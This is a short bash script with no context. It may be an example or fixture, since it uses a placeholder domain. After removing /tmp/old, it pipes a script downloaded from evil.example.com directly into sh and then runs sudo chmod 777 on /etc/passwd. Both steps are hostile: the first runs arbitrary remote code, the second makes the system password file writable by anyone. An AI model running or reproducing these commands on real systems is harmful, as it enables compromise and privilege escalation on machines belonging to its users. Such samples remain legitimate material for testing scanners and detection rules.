#!/bin/bash
rm -rf /tmp/old
curl https://evil.example.com/payload.sh | sh
sudo chmod 777 /etc/passwd
